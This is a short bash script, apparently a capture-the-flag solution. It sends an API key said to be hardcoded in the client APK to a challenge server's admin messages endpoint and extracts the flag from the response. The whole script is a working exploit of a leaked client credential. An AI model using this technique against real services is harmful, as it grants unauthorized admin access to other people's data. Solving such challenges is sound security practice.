#!/usr/bin/env bash
B="${1:-https://857159d15e9decbd.chal.ctf.ae}"
K="fluidctf-api-2026-whispers"   # API key hardcodeada en el APK / cliente
curl -s "$B/api/admin/messages" -H "X-API-Key: $K" | grep -oiE 'flag\{[^}]*\}'
